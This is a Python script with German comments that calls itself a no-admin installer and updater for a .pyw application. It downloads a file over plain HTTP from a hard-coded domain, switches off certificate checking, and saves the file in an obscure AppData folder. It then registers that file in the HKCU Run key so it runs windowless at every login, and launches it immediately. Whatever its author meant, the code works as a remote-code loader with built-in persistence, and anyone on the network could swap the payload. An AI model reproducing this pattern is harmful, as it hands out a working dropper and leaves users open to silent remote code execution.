"""
Einfacher Installer + Updater für eine Python-.pyw-Anwendung
- Keine Admin-Rechte erforderlich
- Nutzt HKCU:Run für Autostart
- Lädt/aktualisiert die Anwendung aus dem Internet
- Erstellt/benutzt eine .venv und startet die App damit (pythonw.exe)
"""

import ssl
import sys
import os
import time
import urllib.request
import subprocess
import winreg
import pathlib as pl

# ────────────────────────────────────────────────
# KONFIGURATION
BASE_DIR = str(pl.Path.home() / "AppData" / "Local" / "Common" / "python" / "src")
FOLDER = "main"
FILE_NAME = "main.py"

UPDATE_URL = "http://main.akirottv.de/"
# ────────────────────────────────────────────────

APP_DIR = os.path.join(BASE_DIR, FOLDER)
APP_PATH = os.path.join(APP_DIR, FILE_NAME)

# venv
VENV_DIR = os.path.join(BASE_DIR, ".venv")
VENV_PY = os.path.join(VENV_DIR, "Scripts", "python.exe")
VENV_PYW = os.path.join(VENV_DIR, "Scripts", "pythonw.exe")


def ensure_venv() -> bool:
    """Erstellt .venv falls nicht vorhanden"""
    if os.path.exists(VENV_PY) or os.path.exists(VENV_PYW):
        return True

    print("→ Erstelle virtuelle Umgebung ...")
    try:
        subprocess.check_call([sys.executable, "-m", "venv", VENV_DIR])
    except Exception as e:
        print("→ Fehler beim Erstellen der venv:", e)
        return False

    return os.path.exists(VENV_PY)


def venv_exe(windowless=True) -> str:
    if windowless and os.path.exists(VENV_PYW):
        return VENV_PYW
    if os.path.exists(VENV_PY):
        return VENV_PY
    return sys.executable


def download_or_update_app() -> bool:
    os.makedirs(APP_DIR, exist_ok=True)

    try:
        print(f"→ Lade {UPDATE_URL} ...")

        context = ssl._create_unverified_context()
        with urllib.request.urlopen(UPDATE_URL, context=context, timeout=15) as resp:
            if resp.status != 200:
                print("Download fehlgeschlagen:", resp.status)
                return False

            content = resp.read()

        with open(APP_PATH, "wb") as f:
            f.write(content)

        print("→ Datei gespeichert:", APP_PATH)
        return True

    except Exception as e:
        print("Download Fehler:", e)
        return False


def add_to_registry_run() -> bool:
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"

    ensure_venv()
    python_exe = venv_exe(windowless=True)

    value = f'"{python_exe}" "{APP_PATH}"'

    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            key_path,
            0,
            winreg.KEY_SET_VALUE
        )

        winreg.SetValueEx(key, FOLDER, 0, winreg.REG_SZ, value)
        winreg.CloseKey(key)

        print("→ Autostart gesetzt")
        return True

    except Exception as e:
        print("Registry Fehler:", e)
        return False


def start_app_now() -> bool:
    if not os.path.exists(APP_PATH):
        print("Datei fehlt:", APP_PATH)
        return False

    ensure_venv()
    python_exe = venv_exe(windowless=False)

    try:
        # ⚠️ WICHTIG: Popen statt run + KEIN shell
        subprocess.Popen(
            [python_exe, FILE_NAME],
            cwd=APP_DIR,
            creationflags=subprocess.CREATE_NEW_CONSOLE
        )

        print("→ Anwendung gestartet")
        return True

    except Exception as e:
        print("Startfehler:", e)
        return False


def main():
    print(f"=== {FOLDER} Installer / Updater ===\n")

    if not download_or_update_app():
        print("❌ Download fehlgeschlagen")
        sys.exit(1)

    print("\n→ Setup venv ...")
    ensure_venv()

    print("\n→ Setze Autostart ...")
    add_to_registry_run()

    print("\n→ Starte App ...")
    start_app_now()

    print("\n✅ Fertig!")
    print("Pfad:", APP_PATH)

    time.sleep(2)


if __name__ == "__main__":
    main()
